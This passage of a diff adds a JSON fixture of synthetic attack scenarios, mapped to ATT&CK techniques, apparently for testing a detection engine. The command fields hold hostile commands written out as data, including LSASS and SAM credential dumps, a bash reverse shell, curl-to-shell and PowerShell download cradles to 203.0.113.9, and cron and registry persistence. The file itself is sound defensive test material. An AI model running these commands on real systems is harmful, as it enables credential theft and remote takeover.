@@ -1,0 +1,4011 @@
+{
+ "scenarios": [
+  {
+   "id": "emu-t1003-001-lsass-procdump",
+   "name": "LSASS memory dump with a renamed procdump",
+   "description": "Synthetic event sequence emulating T1003.001: lsass memory dump with a renamed procdump. Data only; nothing is executed.",
+   "kind": "single",
+   "platform": "windows",
+   "tactics": [
+    "Credential Access"
+   ],
+   "techniques": [
+    "T1003.001"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "process",
+     "executable": "C:\\Users\\bob\\AppData\\Local\\Temp\\pd.exe",
+     "command": "pd.exe -accepteula -ma lsass.exe C:\\Users\\bob\\AppData\\Local\\Temp\\l.dmp",
+     "parent_exe": "C:\\Windows\\System32\\cmd.exe"
+    }
+   ],
+   "expect": [
+    "T1003.001"
+   ]
+  },
+  {
+   "id": "emu-t1003-001-lsass-comsvcs",
+   "name": "LSASS dump through comsvcs MiniDump",
+   "description": "Synthetic event sequence emulating T1003.001: lsass dump through comsvcs minidump. Data only; nothing is executed.",
+   "kind": "single",
+   "platform": "windows",
+   "tactics": [
+    "Credential Access"
+   ],
+   "techniques": [
+    "T1003.001"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "process",
+     "executable": "C:\\Windows\\System32\\rundll32.exe",
+     "command": "rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump 624 C:\\Windows\\Temp\\out.bin full",
+     "parent_exe": "C:\\Windows\\System32\\cmd.exe"
+    }
+   ],
+   "expect": [
+    "T1003.001"
+   ]
+  },
+  {
+   "id": "emu-t1003-002-sam-hive-save",
+   "name": "Registry hive export of SAM and SYSTEM",
+   "description": "Synthetic event sequence emulating T1003.002: registry hive export of sam and system. Data only; nothing is executed.",
+   "kind": "single",
+   "platform": "windows",
+   "tactics": [
+    "Credential Access"
+   ],
+   "techniques": [
+    "T1003.002"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "process",
+     "executable": "C:\\Windows\\System32\\reg.exe",
+     "command": "reg save HKLM\\SAM C:\\Windows\\Temp\\sam.save",
+     "parent_exe": "C:\\Windows\\System32\\cmd.exe"
+    }
+   ],
+   "expect": [
+    "T1003.002"
+   ]
+  },
+  {
+   "id": "emu-t1003-003-ntds-ntdsutil",
+   "name": "Domain database snapshot via ntdsutil",
+   "description": "Synthetic event sequence emulating T1003.003: domain database snapshot via ntdsutil. Data only; nothing is executed.",
+   "kind": "single",
+   "platform": "windows",
+   "tactics": [
+    "Credential Access"
+   ],
+   "techniques": [
+    "T1003.003"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "process",
+     "executable": "C:\\Windows\\System32\\ntdsutil.exe",
+     "command": "ntdsutil \"ac i ntds\" ifm \"create full C:\\temp\\ifm\" q q",
+     "parent_exe": "C:\\Windows\\System32\\cmd.exe"
+    }
+   ],
+   "expect": [
+    "T1003.003"
+   ]
+  },
+  {
+   "id": "emu-t1003-006-dcsync-secretsdump",
+   "name": "Remote replication of directory secrets",
+   "description": "Synthetic event sequence emulating T1003.006: remote replication of directory secrets. Data only; nothing is executed.",
+   "kind": "single",
+   "platform": "windows",
+   "tactics": [
+    "Credential Access"
+   ],
+   "techniques": [
+    "T1003.006"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "process",
+     "executable": "C:\\Tools\\mimikatz.exe",
+     "command": "mimikatz.exe \"lsadump::dcsync /domain:corp.local /user:krbtgt\" exit",
+     "parent_exe": "C:\\Windows\\System32\\cmd.exe"
+    }
+   ],
+   "expect": [
+    "T1003.006"
+   ]
+  },
+  {
+   "id": "emu-t1003-007-proc-mem-read",
+   "name": "Reading another process memory through /proc",
+   "description": "Synthetic event sequence emulating T1003.007: reading another process memory through /proc. Data only; nothing is executed.",
+   "kind": "single",
+   "platform": "linux",
+   "tactics": [
+    "Credential Access"
+   ],
+   "techniques": [
+    "T1003.007"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "process",
+     "executable": "/usr/bin/python3",
+     "command": "python3 -c \"open('/proc/812/mem','rb').read()\"",
+     "parent_exe": "/bin/bash"
+    },
+    {
+     "type": "process",
+     "executable": "/usr/bin/gdb",
+     "command": "gdb -p 812 --batch -ex 'gcore /tmp/dump'",
+     "parent_exe": "/bin/bash",
+     "uid": 0
+    }
+   ],
+   "expect": [
+    "T1003.007"
+   ]
+  },
+  {
+   "id": "emu-t1003-008-shadow-copy",
+   "name": "Copy the shadow password file",
+   "description": "Synthetic event sequence emulating T1003.008: copy the shadow password file. Data only; nothing is executed.",
+   "kind": "single",
+   "platform": "linux",
+   "tactics": [
+    "Credential Access"
+   ],
+   "techniques": [
+    "T1003.008"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "process",
+     "executable": "/bin/cp",
+     "command": "cp /etc/shadow /tmp/.s",
+     "parent_exe": "/bin/bash",
+     "uid": 0
+    }
+   ],
+   "expect": [
+    "T1003.008"
+   ]
+  },
+  {
+   "id": "emu-t1003-008-shadow-file-read",
+   "name": "Unshadow style credential export",
+   "description": "Synthetic event sequence emulating T1003.008: unshadow style credential export. Data only; nothing is executed.",
+   "kind": "single",
+   "platform": "linux",
+   "tactics": [
+    "Credential Access"
+   ],
+   "techniques": [
+    "T1003.008"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "process",
+     "executable": "/usr/bin/unshadow",
+     "command": "unshadow /etc/passwd /etc/shadow",
+     "parent_exe": "/bin/bash",
+     "uid": 0
+    }
+   ],
+   "expect": [
+    "T1003.008"
+   ]
+  },
+  {
+   "id": "emu-t1555-003-browser-creds-win",
+   "name": "Copy browser login database",
+   "description": "Synthetic event sequence emulating T1555.003: copy browser login database. Data only; nothing is executed.",
+   "kind": "single",
+   "platform": "windows",
+   "tactics": [
+    "Credential Access"
+   ],
+   "techniques": [
+    "T1555.003"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "process",
+     "executable": "C:\\Windows\\System32\\cmd.exe",
+     "command": "cmd.exe /c copy \"C:\\Users\\ann\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data\" C:\\Temp\\ld.db",
+     "parent_exe": "C:\\Windows\\explorer.exe"
+    }
+   ],
+   "expect": [
+    "T1555.003"
+   ]
+  },
+  {
+   "id": "emu-t1555-001-keychain-dump",
+   "name": "Keychain extraction with the security tool",
+   "description": "Synthetic event sequence emulating T1555.001: keychain extraction with the security tool. Data only; nothing is executed.",
+   "kind": "single",
+   "platform": "macos",
+   "tactics": [
+    "Credential Access"
+   ],
+   "techniques": [
+    "T1555.001"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "process",
+     "executable": "/usr/bin/security",
+     "command": "security dump-keychain -d login.keychain",
+     "parent_exe": "/bin/zsh"
+    }
+   ],
+   "expect": [
+    "T1555.001"
+   ]
+  },
+  {
+   "id": "emu-t1558-003-kerberoast",
+   "name": "Kerberoasting service tickets",
+   "description": "Synthetic event sequence emulating T1558.003: kerberoasting service tickets. Data only; nothing is executed.",
+   "kind": "single",
+   "platform": "windows",
+   "tactics": [
+    "Credential Access"
+   ],
+   "techniques": [
+    "T1558.003"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "process",
+     "executable": "C:\\Users\\bob\\Rubeus.exe",
+     "command": "Rubeus.exe kerberoast /outfile:hashes.txt",
+     "parent_exe": "C:\\Windows\\System32\\cmd.exe"
+    }
+   ],
+   "expect": [
+    "T1558.003"
+   ]
+  },
+  {
+   "id": "emu-t1552-004-ssh-key-search",
+   "name": "Sweep for private keys",
+   "description": "Synthetic event sequence emulating T1552.004: sweep for private keys. Data only; nothing is executed.",
+   "kind": "single",
+   "platform": "linux",
+   "tactics": [
+    "Credential Access"
+   ],
+   "techniques": [
+    "T1552.004"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "process",
+     "executable": "/usr/bin/find",
+     "command": "find / -name id_rsa -o -name '*.pem' 2>/dev/null",
+     "parent_exe": "/bin/bash"
+    }
+   ],
+   "expect": [
+    "T1552.004"
+   ]
+  },
+  {
+   "id": "emu-t1552-001-env-creds-grep",
+   "name": "Grep configuration files for passwords",
+   "description": "Synthetic event sequence emulating T1552.001: grep configuration files for passwords. Data only; nothing is executed.",
+   "kind": "single",
+   "platform": "linux",
+   "tactics": [
+    "Credential Access"
+   ],
+   "techniques": [
+    "T1552.001"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "process",
+     "executable": "/bin/grep",
+     "command": "grep -ri 'password' /var/www --include=*.conf --include=*.env",
+     "parent_exe": "/bin/bash"
+    }
+   ],
+   "expect": [
+    "T1552.001"
+   ]
+  },
+  {
+   "id": "emu-t1552-005-imds-token",
+   "name": "Cloud metadata credential fetch",
+   "description": "Synthetic event sequence emulating T1552.005: cloud metadata credential fetch. Data only; nothing is executed.",
+   "kind": "single",
+   "platform": "linux",
+   "tactics": [
+    "Credential Access"
+   ],
+   "techniques": [
+    "T1552.005"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "process",
+     "executable": "/usr/bin/curl",
+     "command": "curl http://169.254.169.254/latest/meta-data/iam/security-credentials/",
+     "parent_exe": "/bin/bash"
+    }
+   ],
+   "expect": [
+    "T1552.005"
+   ]
+  },
+  {
+   "id": "emu-t1552-003-bash-history-read",
+   "name": "Mine shell history for secrets",
+   "description": "Synthetic event sequence emulating T1552.003: mine shell history for secrets. Data only; nothing is executed.",
+   "kind": "single",
+   "platform": "linux",
+   "tactics": [
+    "Credential Access"
+   ],
+   "techniques": [
+    "T1552.003"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "process",
+     "executable": "/bin/cat",
+     "command": "cat /home/ann/.bash_history",
+     "parent_exe": "/bin/bash",
+     "uid": 0
+    }
+   ],
+   "expect": [
+    "T1552.003"
+   ]
+  },
+  {
+   "id": "emu-t1110-password-spray-auth",
+   "name": "Burst of failed SSH logins",
+   "description": "Synthetic event sequence emulating T1110: burst of failed ssh logins. Data only; nothing is executed.",
+   "kind": "single",
+   "platform": "linux",
+   "tactics": [
+    "Credential Access"
+   ],
+   "techniques": [
+    "T1110"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "auth",
+     "user": "admin0",
+     "source_ip": "198.51.100.23",
+     "method": "ssh",
+     "outcome": "failure"
+    },
+    {
+     "type": "auth",
+     "user": "admin1",
+     "source_ip": "198.51.100.23",
+     "method": "ssh",
+     "outcome": "failure"
+    },
+    {
+     "type": "auth",
+     "user": "admin2",
+     "source_ip": "198.51.100.23",
+     "method": "ssh",
+     "outcome": "failure"
+    },
+    {
+     "type": "auth",
+     "user": "admin3",
+     "source_ip": "198.51.100.23",
+     "method": "ssh",
+     "outcome": "failure"
+    },
+    {
+     "type": "auth",
+     "user": "admin4",
+     "source_ip": "198.51.100.23",
+     "method": "ssh",
+     "outcome": "failure"
+    },
+    {
+     "type": "auth",
+     "user": "admin5",
+     "source_ip": "198.51.100.23",
+     "method": "ssh",
+     "outcome": "failure"
+    },
+    {
+     "type": "auth",
+     "user": "admin6",
+     "source_ip": "198.51.100.23",
+     "method": "ssh",
+     "outcome": "failure"
+    },
+    {
+     "type": "auth",
+     "user": "admin7",
+     "source_ip": "198.51.100.23",
+     "method": "ssh",
+     "outcome": "failure"
+    }
+   ],
+   "expect": [
+    "T1110"
+   ]
+  },
+  {
+   "id": "emu-t1552-007-kube-token",
+   "name": "Read the kubernetes service account token",
+   "description": "Synthetic event sequence emulating T1552.007: read the kubernetes service account token. Data only; nothing is executed.",
+   "kind": "single",
+   "platform": "linux",
+   "tactics": [
+    "Credential Access"
+   ],
+   "techniques": [
+    "T1552.007"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "process",
+     "executable": "/bin/cat",
+     "command": "cat /var/run/secrets/kubernetes.io/serviceaccount/token",
+     "parent_exe": "/bin/sh"
+    }
+   ],
+   "expect": [
+    "T1552.007"
+   ]
+  },
+  {
+   "id": "emu-t1056-001-keylogger-linux",
+   "name": "Install a keystroke logger",
+   "description": "Synthetic event sequence emulating T1056.001: install a keystroke logger. Data only; nothing is executed.",
+   "kind": "single",
+   "platform": "linux",
+   "tactics": [
+    "Credential Access"
+   ],
+   "techniques": [
+    "T1056.001"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "process",
+     "executable": "/usr/bin/logkeys",
+     "command": "logkeys --start --output /tmp/.k",
+     "parent_exe": "/bin/bash",
+     "uid": 0
+    }
+   ],
+   "expect": [
+    "T1056.001"
+   ]
+  },
+  {
+   "id": "emu-t1556-003-pam-tamper",
+   "name": "Modify PAM configuration",
+   "description": "Synthetic event sequence emulating T1556.003: modify pam configuration. Data only; nothing is executed.",
+   "kind": "single",
+   "platform": "linux",
+   "tactics": [
+    "Persistence"
+   ],
+   "techniques": [
+    "T1556.003"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "file",
+     "path": "/etc/pam.d/sshd",
+     "operation": "modify"
+    },
+    {
+     "type": "file",
+     "path": "/lib/security/pam_unix2.so",
+     "operation": "create"
+    }
+   ],
+   "expect": [
+    "T1556.003"
+   ]
+  },
+  {
+   "id": "emu-t1059-001-pwsh-encoded",
+   "name": "Base64 encoded PowerShell",
+   "description": "Synthetic event sequence emulating T1059.001: base64 encoded powershell. Data only; nothing is executed.",
+   "kind": "single",
+   "platform": "windows",
+   "tactics": [
+    "Execution"
+   ],
+   "techniques": [
+    "T1059.001"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "process",
+     "executable": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+     "command": "powershell.exe -NoP -W Hidden -Enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAKQA=",
+     "parent_exe": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE"
+    }
+   ],
+   "expect": [
+    "T1059.001"
+   ]
+  },
+  {
+   "id": "emu-t1059-001-pwsh-downloadstring",
+   "name": "PowerShell download cradle",
+   "description": "Synthetic event sequence emulating T1059.001: powershell download cradle. Data only; nothing is executed.",
+   "kind": "single",
+   "platform": "windows",
+   "tactics": [
+    "Execution"
+   ],
+   "techniques": [
+    "T1059.001"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "process",
+     "executable": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+     "command": "powershell -nop -c \"IEX (New-Object Net.WebClient).DownloadString('http://203.0.113.9/a.ps1')\"",
+     "parent_exe": "C:\\Windows\\System32\\cmd.exe"
+    }
+   ],
+   "expect": [
+    "T1059.001"
+   ]
+  },
+  {
+   "id": "emu-t1059-002-applescript-shell",
+   "name": "osascript running a shell command",
+   "description": "Synthetic event sequence emulating T1059.002: osascript running a shell command. Data only; nothing is executed.",
+   "kind": "single",
+   "platform": "macos",
+   "tactics": [
+    "Execution"
+   ],
+   "techniques": [
+    "T1059.002"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "process",
+     "executable": "/usr/bin/osascript",
+     "command": "osascript -e 'do shell script \"curl -s http://203.0.113.9/p | sh\"'",
+     "parent_exe": "/bin/zsh"
+    }
+   ],
+   "expect": [
+    "T1059.002"
+   ]
+  },
+  {
+   "id": "emu-t1059-004-reverse-shell-bash",
+   "name": "Bash reverse shell",
+   "description": "Synthetic event sequence emulating T1059.004: bash reverse shell. Data only; nothing is executed.",
+   "kind": "single",
+   "platform": "linux",
+   "tactics": [
+    "Execution"
+   ],
+   "techniques": [
+    "T1059.004"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "process",
+     "executable": "/bin/bash",
+     "command": "bash -i >& /dev/tcp/203.0.113.9/4444 0>&1",
+     "parent_exe": "/usr/sbin/apache2",
+     "uid": 33
+    }
+   ],
+   "expect": [
+    "T1059.004"
+   ]
+  },
+  {
+   "id": "emu-t1059-006-python-pty-spawn",
+   "name": "Python pty shell upgrade",
+   "description": "Synthetic event sequence emulating T1059.006: python pty shell upgrade. Data only; nothing is executed.",
+   "kind": "single",
+   "platform": "linux",
+   "tactics": [
+    "Execution"
+   ],
+   "techniques": [
+    "T1059.006"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "process",
+     "executable": "/usr/bin/python3",
+     "command": "python3 -c 'import pty; pty.spawn(\"/bin/bash\")'",
+     "parent_exe": "/bin/sh"
+    }
+   ],
+   "expect": [
+    "T1059.006"
+   ]
+  },
+  {
+   "id": "emu-t1059-005-vbs-wscript",
+   "name": "WScript running a dropped VBS",
+   "description": "Synthetic event sequence emulating T1059.005: wscript running a dropped vbs. Data only; nothing is executed.",
+   "kind": "single",
+   "platform": "windows",
+   "tactics": [
+    "Execution"
+   ],
+   "techniques": [
+    "T1059.005"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "process",
+     "executable": "C:\\Windows\\System32\\wscript.exe",
+     "command": "wscript.exe //B C:\\Users\\ann\\AppData\\Local\\Temp\\inv.vbs",
+     "parent_exe": "C:\\Windows\\System32\\cmd.exe"
+    }
+   ],
+   "expect": [
+    "T1059.005"
+   ]
+  },
+  {
+   "id": "emu-t1059-007-node-child-shell",
+   "name": "Node process spawning a shell payload",
+   "description": "Synthetic event sequence emulating T1059.007: node process spawning a shell payload. Data only; nothing is executed.",
+   "kind": "single",
+   "platform": "linux",
+   "tactics": [
+    "Execution"
+   ],
+   "techniques": [
+    "T1059.007"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "process",
+     "executable": "/usr/bin/node",
+     "command": "node -e \"require('child_process').exec('curl 203.0.113.9/x|sh')\"",
+     "parent_exe": "/bin/bash"
+    }
+   ],
+   "expect": [
+    "T1059.007"
+   ]
+  },
+  {
+   "id": "emu-t1047-wmic-process-create",
+   "name": "WMI process call create",
+   "description": "Synthetic event sequence emulating T1047: wmi process call create. Data only; nothing is executed.",
+   "kind": "single",
+   "platform": "windows",
+   "tactics": [
+    "Lateral Movement"
+   ],
+   "techniques": [
+    "T1047"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "process",
+     "executable": "C:\\Windows\\System32\\wbem\\WMIC.exe",
+     "command": "wmic /node:10.0.0.7 process call create \"cmd.exe /c whoami\"",
+     "parent_exe": "C:\\Windows\\System32\\cmd.exe"
+    }
+   ],
+   "expect": [
+    "T1047"
+   ]
+  },
+  {
+   "id": "emu-t1204-002-user-exec-dropper",
+   "name": "Office document launching a script host",
+   "description": "Synthetic event sequence emulating T1204.002: office document launching a script host. Data only; nothing is executed.",
+   "kind": "single",
+   "platform": "windows",
+   "tactics": [
+    "Execution"
+   ],
+   "techniques": [
+    "T1204.002"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "process",
+     "executable": "C:\\Windows\\System32\\wscript.exe",
+     "command": "wscript.exe C:\\Users\\ann\\Downloads\\invoice.js",
+     "parent_exe": "C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE"
+    }
+   ],
+   "expect": [
+    "T1204.002"
+   ]
+  },
+  {
+   "id": "emu-t1204-002-curl-pipe-sh",
+   "name": "Pipe a downloaded script into a shell",
+   "description": "Synthetic event sequence emulating T1204.002: pipe a downloaded script into a shell. Data only; nothing is executed.",
+   "kind": "single",
+   "platform": "linux",
+   "tactics": [
+    "Execution"
+   ],
+   "techniques": [
+    "T1204.002"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "process",
+     "executable": "/usr/bin/curl",
+     "command": "curl -fsSL http://203.0.113.9/i.sh | bash",
+     "parent_exe": "/bin/bash"
+    }
+   ],
+   "expect": [
+    "T1204.002"
+   ]
+  },
+  {
+   "id": "emu-t1204-004-clickfix-paste",
+   "name": "Run dialog paste of a PowerShell one-liner",
+   "description": "Synthetic event sequence emulating T1204.004: run dialog paste of a powershell one-liner. Data only; nothing is executed.",
+   "kind": "single",
+   "platform": "windows",
+   "tactics": [
+    "Execution"
+   ],
+   "techniques": [
+    "T1204.004"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "process",
+     "executable": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+     "command": "powershell -w hidden -c iex(irm http://203.0.113.9/verify)",
+     "parent_exe": "C:\\Windows\\explorer.exe"
+    }
+   ],
+   "expect": [
+    "T1204.004"
+   ]
+  },
+  {
+   "id": "emu-t1620-reflective-load",
+   "name": "memfd based in-memory execution",
+   "description": "Synthetic event sequence emulating T1620: memfd based in-memory execution. Data only; nothing is executed.",
+   "kind": "single",
+   "platform": "linux",
+   "tactics": [
+    "Execution"
+   ],
+   "techniques": [
+    "T1620"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "process",
+     "executable": "/usr/bin/python3",
+     "command": "python3 -c \"import os;fd=os.memfd_create('x');os.fexecve(fd,['x'],{})\"",
+     "parent_exe": "/bin/bash"
+    }
+   ],
+   "expect": [
+    "T1620"
+   ]
+  },
+  {
+   "id": "emu-t1609-container-exec",
+   "name": "Command run inside a container",
+   "description": "Synthetic event sequence emulating T1609: command run inside a container. Data only; nothing is executed.",
+   "kind": "single",
+   "platform": "linux",
+   "tactics": [
+    "Execution"
+   ],
+   "techniques": [
+    "T1609"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "process",
+     "executable": "/usr/bin/docker",
+     "command": "docker exec -it web sh -c 'cat /etc/passwd'",
+     "parent_exe": "/bin/bash"
+    }
+   ],
+   "expect": [
+    "T1609"
+   ]
+  },
+  {
+   "id": "emu-t1651-cloud-cli-admin",
+   "name": "Cloud run-command on an instance",
+   "description": "Synthetic event sequence emulating T1651: cloud run-command on an instance. Data only; nothing is executed.",
+   "kind": "single",
+   "platform": "linux",
+   "tactics": [
+    "Execution"
+   ],
+   "techniques": [
+    "T1651"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "process",
+     "executable": "/usr/local/bin/aws",
+     "command": "aws ssm send-command --instance-ids i-0abc --document-name AWS-RunShellScript --parameters commands=id",
+     "parent_exe": "/bin/bash"
+    }
+   ],
+   "expect": [
+    "T1651"
+   ]
+  },
+  {
+   "id": "emu-t1612-docker-build-host",
+   "name": "Build an image on a host from a remote context",
+   "description": "Synthetic event sequence emulating T1612: build an image on a host from a remote context. Data only; nothing is executed.",
+   "kind": "single",
+   "platform": "linux",
+   "tactics": [
+    "Execution"
+   ],
+   "techniques": [
+    "T1612"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "process",
+     "executable": "/usr/bin/docker",
+     "command": "docker build -t x http://203.0.113.9/ctx.tar",
+     "parent_exe": "/bin/bash"
+    }
+   ],
+   "expect": [
+    "T1612"
+   ]
+  },
+  {
+   "id": "emu-t1053-003-cron-persist",
+   "name": "Add a cron entry that fetches a script",
+   "description": "Synthetic event sequence emulating T1053.003: add a cron entry that fetches a script. Data only; nothing is executed.",
+   "kind": "single",
+   "platform": "linux",
+   "tactics": [
+    "Persistence"
+   ],
+   "techniques": [
+    "T1053.003"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "process",
+     "executable": "/usr/bin/crontab",
+     "command": "crontab -l | { cat; echo '*/5 * * * * curl -s http://203.0.113.9/r|sh'; } | crontab -",
+     "parent_exe": "/bin/bash"
+    }
+   ],
+   "expect": [
+    "T1053.003"
+   ]
+  },
+  {
+   "id": "emu-t1053-003-cron-file-drop",
+   "name": "Write a cron.d job",
+   "description": "Synthetic event sequence emulating T1053.003: write a cron.d job. Data only; nothing is executed.",
+   "kind": "single",
+   "platform": "linux",
+   "tactics": [
+    "Persistence"
+   ],
+   "techniques": [
+    "T1053.003"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "file",
+     "path": "/etc/cron.d/sysstat-update",
+     "operation": "create"
+    }
+   ],
+   "expect": [
+    "T1053.003"
+   ]
+  },
+  {
+   "id": "emu-t1053-005-schtasks-create",
+   "name": "Scheduled task launching from AppData",
+   "description": "Synthetic event sequence emulating T1053.005: scheduled task launching from appdata. Data only; nothing is executed.",
+   "kind": "single",
+   "platform": "windows",
+   "tactics": [
+    "Persistence"
+   ],
+   "techniques": [
+    "T1053.005"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "process",
+     "executable": "C:\\Windows\\System32\\schtasks.exe",
+     "command": "schtasks /create /sc minute /mo 5 /tn Updater /tr C:\\Users\\ann\\AppData\\Roaming\\u.exe",
+     "parent_exe": "C:\\Windows\\System32\\cmd.exe"
+    }
+   ],
+   "expect": [
+    "T1053.005"
+   ]
+  },
+  {
+   "id": "emu-t1543-002-systemd-unit",
+   "name": "Drop a systemd service unit",
+   "description": "Synthetic event sequence emulating T1543.002: drop a systemd service unit. Data only; nothing is executed.",
+   "kind": "single",
+   "platform": "linux",
+   "tactics": [
+    "Persistence"
+   ],
+   "techniques": [
+    "T1543.002"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "file",
+     "path": "/etc/systemd/system/netcheck.service",
+     "operation": "create"
+    },
+    {
+     "type": "process",
+     "executable": "/usr/bin/systemctl",
+     "command": "systemctl enable --now netcheck.service",
+     "parent_exe": "/bin/bash",
+     "uid": 0
+    }
+   ],
+   "expect": [
+    "T1543.002"
+   ]
+  },
+  {
+   "id": "emu-t1543-001-launch-agent",
+   "name": "User launch agent plist",
+   "description": "Synthetic event sequence emulating T1543.001: user launch agent plist. Data only; nothing is executed.",
+   "kind": "single",
+   "platform": "macos",
+   "tactics": [
+    "Persistence"
+   ],
+   "techniques": [
+    "T1543.001"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "file",
+     "path": "/Users/ann/Library/LaunchAgents/com.apple.update.plist",
+     "operation": "create"
+    }
+   ],
+   "expect": [
+    "T1543.001"
+   ]
+  },
+  {
+   "id": "emu-t1543-004-launch-daemon",
+   "name": "System launch daemon plist",
+   "description": "Synthetic event sequence emulating T1543.004: system launch daemon plist. Data only; nothing is executed.",
+   "kind": "single",
+   "platform": "macos",
+   "tactics": [
+    "Persistence"
+   ],
+   "techniques": [
+    "T1543.004"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "file",
+     "path": "/Library/LaunchDaemons/com.vendor.helper.plist",
+     "operation": "create"
+    }
+   ],
+   "expect": [
+    "T1543.004"
+   ]
+  },
+  {
+   "id": "emu-t1547-001-run-key",
+   "name": "Run key pointing at AppData",
+   "description": "Synthetic event sequence emulating T1547.001: run key pointing at appdata. Data only; nothing is executed.",
+   "kind": "single",
+   "platform": "windows",
+   "tactics": [
+    "Persistence"
+   ],
+   "techniques": [
+    "T1547.001"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "registry",
+     "key": "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
+     "operation": "set",
+     "value_name": "Sync",
+     "value_data": "C:\\Users\\ann\\AppData\\Roaming\\sync\\sync.exe"
+    }
+   ],
+   "expect": [
+    "T1547.001"
+   ]
+  },
+  {
+   "id": "emu-t1547-001-startup-folder",
+   "name": "Dropper in the Startup folder",
+   "description": "Synthetic event sequence emulating T1547.001: dropper in the startup folder. Data only; nothing is executed.",
+   "kind": "single",
+   "platform": "windows",
+   "tactics": [
+    "Persistence"
+   ],
+   "techniques": [
+    "T1547.001"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "file",
+     "path": "C:\\Users\\ann\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\update.lnk",
+     "operation": "create"
+    }
+   ],
+   "expect": [
+    "T1547.001"
+   ]
+  },
+  {
+   "id": "emu-t1543-003-new-service",
+   "name": "Service created with sc.exe",
+   "description": "Synthetic event sequence emulating T1543.003: service created with sc.exe. Data only; nothing is executed.",
+   "kind": "single",
+   "platform": "windows",
+   "tactics": [
+    "Persistence"
+   ],
+   "techniques": [
+    "T1543.003"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "process",
+     "executable": "C:\\Windows\\System32\\sc.exe",
+     "command": "sc create WinSvcHelper binPath= C:\\ProgramData\\h.exe start= auto",
+     "parent_exe": "C:\\Windows\\System32\\cmd.exe"
+    }
+   ],
+   "expect": [
+    "T1543.003"
+   ]
+  },
+  {
+   "id": "emu-t1546-003-wmi-subscription",
+   "name": "WMI permanent event subscription",
+   "description": "Synthetic event sequence emulating T1546.003: wmi permanent event subscription. Data only; nothing is executed.",
+   "kind": "single",
+   "platform": "windows",
+   "tactics": [
+    "Persistence"
+   ],
+   "techniques": [
+    "T1546.003"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "process",
+     "executable": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+     "command": "powershell Set-WmiInstance -Class __EventFilter -Namespace root\\subscription",
+     "parent_exe": "C:\\Windows\\System32\\cmd.exe"
+    }
+   ],
+   "expect": [
+    "T1546.003"
+   ]
+  },
+  {
+   "id": "emu-t1546-012-ifeo-debugger",
+   "name": "Image file execution options debugger",
+   "description": "Synthetic event sequence emulating T1546.012: image file execution options debugger. Data only; nothing is executed.",
+   "kind": "single",
+   "platform": "windows",
+   "tactics": [
+    "Persistence"
+   ],
+   "techniques": [
+    "T1546.012"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "registry",
+     "key": "HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe",
+     "operation": "set",
+     "value_name": "Debugger",
+     "value_data": "C:\\Windows\\System32\\cmd.exe"
+    }
+   ],
+   "expect": [
+    "T1546.012"
+   ]
+  },
+  {
+   "id": "emu-t1547-004-winlogon-shell",
+   "name": "Winlogon userinit hijack",
+   "description": "Synthetic event sequence emulating T1547.004: winlogon userinit hijack. Data only; nothing is executed.",
+   "kind": "single",
+   "platform": "windows",
+   "tactics": [
+    "Persistence"
+   ],
+   "techniques": [
+    "T1547.004"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "registry",
